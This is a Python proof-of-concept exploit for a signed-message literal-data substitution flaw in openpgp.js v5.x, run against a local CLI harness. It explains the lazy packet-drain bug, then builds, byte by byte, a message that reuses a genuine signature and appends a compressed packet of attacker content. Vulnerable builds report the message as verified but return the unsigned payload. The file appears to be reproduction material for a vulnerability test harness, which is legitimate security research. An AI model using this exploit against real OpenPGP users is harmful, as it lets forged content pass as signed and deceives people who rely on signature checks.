#!/usr/bin/env python3
"""
PoC: openpgp.js signed-message literal-data substitution via a trailing
compressed packet (lazy packet-stream drain inconsistency).

Target: /workspace/artifacts/target/openpgpjs (Node.js SEA ELF embedding
openpgp.js v5.x plus a small CLI harness).

Mechanism
---------
The CLI's `verify` command returns `{ verified, data }` where `verified`
comes from `Message.verify()` but `data` comes from reading the *message's
literal content afterwards* (Message.getText()/getLiteralData()).

Inside openpgp.js:

  * Message.verify() first computes `literalDataList` from the packets that
    are present *eagerly*, then drains the remaining lazily-parsed packet
    stream (Signature, and whatever follows it) and verifies the signature
    over the literal packet(s) it captured *before* the drain.
  * Message.getText()/getLiteralData() runs *after* the drain, so it sees the
    fully materialised packet list and "unwraps" any Compressed Data packet
    it now finds, returning the literal data hidden inside it.

So for a crafted message laid out as

    OnePassSignature | LiteralData(BASELINE) | Signature | Compressed(LiteralData(PAYLOAD))

the signature is verified against the outer (baseline) literal packet and
reports verified=true, while the data handed back to the caller is read out
of the trailing compressed container -> the attacker payload.  No new
signature is ever created: the byte-identical baseline Signature packet is
reused verbatim.

Expected per-build behaviour:
  * vulnerable build: verified == true and returned data == PAYLOAD.
  * fixed build:      verified == true and returned data == BASELINE
                      (the literal that was actually verified).

The harness's `replace-literal` subcommand implements exactly this craft
(verified during analysis), but this script does NOT rely on it: the crafted
message is assembled byte-by-byte with stdlib only, which keeps the PoC
meaningful even if that subcommand is removed.

Output: exactly one JSON object on stdout with the required contract.
"""

import base64
import json
import os
import re
import struct
import subprocess
import sys
import tempfile
import time

BINARY = "/workspace/artifacts/target/openpgpjs"
TIMEOUT = int(os.environ.get("POC_TIMEOUT", "120"))

# The embedded attacker payload. Distinct from, and clearly not derived
# from, the baseline data.
PAYLOAD = (b"=== ATTACKER-CONTROLLED CONTENT ===\n"
           b"This payload was NOT signed by the key holder.\n"
           b"It was smuggled inside a trailing compressed packet\n"
           b"appended after the genuine signature packet.\n")

BASELINE = (b"Hello, this is the legitimate baseline data.\n"
            b"It is the only content the victim key actually signed.\n")


# ---------------------------------------------------------------------------
# Minimal OpenPGP packet helpers (new-format packets, definite lengths).
# ---------------------------------------------------------------------------

def packet(tag, body):
    """Serialize a new-format packet with a definite length."""
    n = len(body)
    if n < 192:
        length = bytes([n])
    elif n < 8384:
        n -= 192
        length = bytes([(n >> 8) + 192, n & 0xFF])
    else:
        length = b"\xff" + struct.pack(">I", n)
    return bytes([0xC0 | tag]) + length + body


def literal_packet(data):
    """Literal Data packet (tag 11), format 'b', empty filename, date 0."""
    return packet(11, b"b" + bytes([0]) + struct.pack(">I", 0) + data)


def uncompressed_compressed_packet(inner):
    """Compressed Data packet (tag 8) with algorithm 0 (uncompressed)."""
    return packet(8, b"\x00" + inner)


def armor_message(raw):
    b64 = base64.b64encode(raw).decode("ascii")
    lines = [b64[i:i + 64] for i in range(0, len(b64), 64)]
    return ("-----BEGIN PGP MESSAGE-----\n\n"
            + "\n".join(lines)
            + "\n-----END PGP MESSAGE-----\n")


_ARMOR_RE = re.compile(
    r"-----BEGIN PGP ([A-Z ]+)-----\r?\n(.*?)-----END PGP \1-----", re.S)


def unarmor(text):
    m = _ARMOR_RE.search(text)
    if not m:
        raise ValueError("no ASCII-armored block found")
    chunks = []
    for line in m.group(2).splitlines():
        line = line.strip()
        if not line or line.startswith("=") or ":" in line:
            continue  # armor headers / checksum line
        chunks.append(line)
    return base64.b64decode("".join(chunks))


def split_packets(raw):
    """Split a packet sequence into (tag, full_packet_bytes) pairs."""
    out = []
    i = 0
    while i < len(raw):
        b0 = raw[i]
        if not (b0 & 0x80):
            raise ValueError("invalid packet header byte 0x%02x" % b0)
        start = i
        i += 1
        if b0 & 0x40:  # new format
            tag = b0 & 0x3F
            lb = raw[i]
            i += 1
            if lb < 192:
                ln = lb
            elif lb < 224:
                ln = ((lb - 192) << 8) + raw[i] + 192
                i += 1
            elif lb == 255:
                ln = struct.unpack(">I", raw[i:i + 4])[0]
                i += 4
            else:
                raise ValueError("unexpected partial body length in "
                                 "signed message")
        else:  # old format
            tag = (b0 >> 2) & 0x0F
            lt = b0 & 0x03
            if lt == 0:
                ln = raw[i]
                i += 1
            elif lt == 1:
                ln = struct.unpack(">H", raw[i:i + 2])[0]
                i += 2
            elif lt == 2:
                ln = struct.unpack(">I", raw[i:i + 4])[0]
                i += 4
            else:
                raise ValueError("indeterminate length not supported")
        i += ln
        out.append((tag, raw[start:i]))
    return out


# ---------------------------------------------------------------------------
# Runner helpers
# ---------------------------------------------------------------------------

def b64e(b):
    return base64.b64encode(b).decode("ascii")


def text_of(b):
    return b.decode("utf-8", "replace")


def make_result(binary, command):
    return {
        "binary": binary,
        "command": command,
        "returncode": None,
        "signal": None,
        "timed_out": False,
        "runtime_ms": 0,
        "stdout": "",
        "stderr": "",
        "observable": {"kind": "custom", "value": None},
        "error": None,
    }


def fail(binary, command, message, **kw):
    res = make_result(binary, command)
    res["error"] = message
    res.update(kw)
    print(json.dumps(res))
    sys.exit(0)


def run_cli(args, cwd):
    """Run the target binary; return (parsed_json_or_None, meta_dict)."""
    cmd = [BINARY] + args
    t0 = time.monotonic()
    try:
        proc = subprocess.run(cmd, capture_output=True, timeout=TIMEOUT,
                              cwd=cwd)
        runtime_ms = int((time.monotonic() - t0) * 1000)
        out = proc.stdout.decode("utf-8", "replace")
        err = proc.stderr.decode("utf-8", "replace")
        meta = {
            "returncode": proc.returncode if proc.returncode >= 0 else None,
            "signal": -proc.returncode if proc.returncode < 0 else None,
            "runtime_ms": runtime_ms,
            "stdout": out,
            "stderr": err,
        }
        try:
            return json.loads(out.strip()), meta
        except ValueError:
            return None, meta
    except subprocess.TimeoutExpired as exc:
        runtime_ms = int((time.monotonic() - t0) * 1000)
        meta = {
            "returncode": None,
            "signal": None,
            "runtime_ms": runtime_ms,
            "stdout": (exc.stdout or b"").decode("utf-8", "replace")
                      if isinstance(exc.stdout, (bytes, str)) else "",
            "stderr": (exc.stderr or b"").decode("utf-8", "replace")
                      if isinstance(exc.stderr, (bytes, str)) else "",
        }
        return None, {**meta, "timed_out": True}


def main():
    command = ("keygen --out-dir $WORK/keys --name victim && "
               "sign --key $WORK/keys/victim-private.asc "
               "--data $WORK/baseline.txt --out $WORK/signed.asc && "
               "verify --message $WORK/signed.asc "
               "--key $WORK/keys/victim-public.asc && "
               "verify --message $WORK/crafted.asc "
               "--key $WORK/keys/victim-public.asc")

    if not os.path.isfile(BINARY) or not os.access(BINARY, os.X_OK):
        fail(BINARY, command, "target binary missing or not executable",
             returncode=127)

    work = tempfile.mkdtemp(prefix="openpgpjs-poc-")
    keys_dir = os.path.join(work, "keys")
    os.makedirs(keys_dir, exist_ok=True)
    priv = os.path.join(keys_dir, "victim-private.asc")
    pub = os.path.join(keys_dir, "victim-public.asc")
    baseline_file = os.path.join(work, "baseline.txt")
    signed_file = os.path.join(work, "signed.asc")
    crafted_file = os.path.join(work, "crafted.asc")
    total_runtime = [0]

    def cli(args):
        parsed, meta = run_cli(args, work)
        total_runtime[0] += meta.get("runtime_ms", 0)
        return parsed, meta

    # -- 1. generate a fresh key pair --------------------------------------
    keygen, meta = cli(["keygen", "--out-dir", keys_dir,
                        "--name", "victim"])
    if meta.get("timed_out"):
        fail(BINARY, command, "keygen timed out", **meta)
    if not keygen or not keygen.get("ok"):
        fail(BINARY, command, "keygen failed", **meta)

    # -- 2. sign the baseline data -----------------------------------------
    with open(baseline_file, "wb") as fh:
        fh.write(BASELINE)
    sign, meta = cli(["sign", "--key", priv, "--data", baseline_file,
                      "--out", signed_file])
    if meta.get("timed_out"):
        fail(BINARY, command, "sign timed out", **meta)
    if not sign or not sign.get("ok"):
        fail(BINARY, command, "sign failed", **meta)

    # -- 3. verify the baseline signed message ------------------------------
    base_ver, meta = cli(["verify", "--message", signed_file,
                          "--key", pub])
    if meta.get("timed_out"):
        fail(BINARY, command, "baseline verify timed out", **meta)
    if not base_ver or not base_ver.get("ok"):
        fail(BINARY, command, "baseline verify failed", **meta)

    baseline_verified = bool(base_ver.get("verified"))
    base_data = base_ver.get("data") or {}
    baseline_raw = base64.b64decode(base_data.get("b64", "")) \
        if base_data.get("b64") else BASELINE
    if not baseline_verified:
        fail(BINARY, command,
             "baseline message did not verify; cannot proceed", **meta)

    # -- 4. craft the malicious message -------------------------------------
    # Baseline signed message layout: OPS | LiteralData(B) | Signature.
    # Crafted layout: OPS | LiteralData(B) | Signature | Compressed(Lit(P)).
    # The signature packet bytes are reused verbatim -- no new signature.
    try:
        raw_signed = unarmor(open(signed_file, "r", encoding="utf-8").read())
        packets = split_packets(raw_signed)
    except Exception as exc:
        fail(BINARY, command, "could not parse signed message: %s" % exc,
             **meta)

    tags = [t for t, _ in packets]
    lit_pkts = [p for t, p in packets if t == 11]
    sig_pkts = [p for t, p in packets if t == 2]
    ops_pkts = [p for t, p in packets if t == 4]
    if not (lit_pkts and sig_pkts and ops_pkts):
        fail(BINARY, command,
             "unexpected baseline packet layout: %s" % tags, **meta)

    crafted = (ops_pkts[0] + lit_pkts[0] + sig_pkts[0]
               + uncompressed_compressed_packet(literal_packet(PAYLOAD)))
    with open(crafted_file, "w", encoding="utf-8") as fh:
        fh.write(armor_message(crafted))

    # -- 5. verify the crafted message --------------------------------------
    crafted_ver, meta = cli(["verify", "--message", crafted_file,
                             "--key", pub])
    final_meta = dict(meta)
    final_meta["runtime_ms"] = total_runtime[0]
    if meta.get("timed_out"):
        fail(BINARY, command, "crafted verify timed out", **meta)
    if not crafted_ver or not crafted_ver.get("ok"):
        fail(BINARY, command,
             "crafted verify failed at CLI level", **meta)

    verified = bool(crafted_ver.get("verified"))
    cdata = crafted_ver.get("data") or {}
    crafted_raw = base64.b64decode(cdata.get("b64", "")) \
        if cdata.get("b64") else b""

    # -- 6. report -----------------------------------------------------------
    value = {
        "verified": verified,
        "data_b64": b64e(crafted_raw),
        "data_text": text_of(crafted_raw),
        "baseline_verified": baseline_verified,
        "baseline_data_b64": b64e(baseline_raw),
        "baseline_data_text": text_of(baseline_raw),
        "payload_b64": b64e(PAYLOAD),
        "payload_text": text_of(PAYLOAD),
        "path": None,
    }

    res = make_result(BINARY, command)
    res.update(final_meta)
    res["observable"]["value"] = json.dumps(value)

    # Interpretation / sanity of the oracle itself.
    if not verified:
        res["error"] = ("crafted message did not verify; signature "
                        "substitution oracle not triggered")
    elif crafted_raw == PAYLOAD:
        res["error"] = None  # vulnerable behaviour observed
    elif crafted_raw == baseline_raw:
        res["error"] = None  # fixed behaviour observed (baseline returned)
    else:
        res["error"] = ("verify succeeded but returned unexpected data "
                        "(neither payload nor baseline)")

    print(json.dumps(res))
    sys.exit(0)


if __name__ == "__main__":
    try:
        main()
    except SystemExit:
        raise
    except Exception as exc:  # never crash without emitting the contract
        fail(BINARY, "poc", "unhandled error: %r" % (exc,))
